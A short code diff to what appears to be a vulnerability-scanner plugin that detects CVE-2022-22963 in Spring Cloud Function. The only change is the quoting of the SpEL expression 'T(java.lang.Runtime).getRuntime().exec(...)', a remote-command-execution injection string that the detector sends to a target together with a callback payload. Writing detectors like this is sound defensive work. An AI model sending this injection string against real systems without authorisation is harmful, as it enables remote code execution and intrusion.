@@ -116,7 +116,7 @@ class Cve202222963Detector(tsunami_plugin.VulnDetector):
     payload = self.payload_generator.generate(config)
     if not payload.get_payload_attributes().uses_callback_server:
       return False
-    rce_command = 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(
+    rce_command = "T(java.lang.Runtime).getRuntime().exec('{}')".format(
         payload.get_payload()
     )
     url = self._BuildUrl(network_service)
